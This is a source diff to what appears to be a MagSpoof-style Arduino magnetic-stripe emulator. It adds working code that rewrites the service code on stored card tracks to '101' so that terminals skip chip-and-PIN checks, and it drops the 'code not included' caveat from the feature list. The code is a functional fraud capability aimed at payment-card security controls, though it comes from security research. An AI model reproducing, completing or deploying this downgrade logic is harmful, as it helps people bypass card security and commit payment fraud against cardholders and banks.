@@ -7,7 +7,7 @@
  *
  * - Allows you to store all of your credit cards and magstripes in one device
  * - Works on traditional magstripe readers wirelessly (no NFC/RFID required)
- * - Can disable Chip-and-PIN (code not included)
+ * - Can disable Chip-and-PIN
  * - Correctly predicts Amex credit card numbers + expirations from previous card number (code not included)
  * - Supports all three magnetic stripe tracks, and even supports Track 1+2 simultaneously
  * - Easy to build using Arduino or ATtiny
@@ -33,6 +33,9 @@ const char* tracks[] = {
 "%B123456781234567^LASTNAME/FIRST^YYMMSSSDDDDDDDDDDDDDDDDDDDDDDDDD?\0", // Track 1
 ";123456781234567=YYMMSSSDDDDDDDDDDDDDD?\0" // Track 2
 };
+
+// service code to make requirements more lax and disable chip-and-PIN (third digit)
+const char* sc_rep = { "101" };
 
 char revTrack[41];
 
@@ -104,7 +107,7 @@ void reverseTrack(int track)
 // plays out a full track, calculating CRCs and LRC
 void playTrack(int track)
 {
-  int tmp, crc, lrc = 0;
+  int tmp, crc, lrc, cnt = 0;
   track--; // index 0
   dir = 0;
 
@@ -119,7 +122,22 @@ void playTrack(int track)
   for (int i = 0; tracks[track][i] != '\0'; i++)
   {
     crc = 1;
-    tmp = tracks[track][i] - sublen[track];
+    
+		if(cnt<0)
+			cnt--;
+		else { // look for FS
+			if(tracks[track][i]=='^')
+				cnt++;
+			if(tracks[track][i]=='=')
+				cnt+=2;
+				
+			if(cnt==2)
+				cnt=-1;
+		}
+		if (cnt<-5 && cnt>-9) // SS is located 4 chars after the last FS
+			tmp = sc_rep[8+cnt] - sublen[track];
+		else
+			tmp = tracks[track][i] - sublen[track];
 
     for (int j = 0; j < bitlen[track]-1; j++)
     {
@@ -169,14 +187,29 @@ void playTrack(int track)
 // stores track for reverse usage later
 void storeRevTrack(int track)
 {
-  int i, tmp, crc, lrc = 0;
+  int i, tmp, crc, lrc, cnt = 0;
   track--; // index 0
   dir = 0;
 
   for (i = 0; tracks[track][i] != '\0'; i++)
   {
     crc = 1;
-    tmp = tracks[track][i] - sublen[track];
+    
+		if(cnt<0)
+			cnt--;
+		else { // look for FS
+			if(tracks[track][i]=='^')
+				cnt++;
+			if(tracks[track][i]=='=')
+				cnt+=2;
+				
+			if(cnt==2)
+				cnt=-1;
+		}
+		if (cnt<-5 && cnt>-9) // SS is located 4 chars after the last FS
+			tmp = sc_rep[8+cnt] - sublen[track];
+		else
+			tmp = tracks[track][i] - sublen[track];
 
     for (int j = 0; j < bitlen[track]-1; j++)
     {
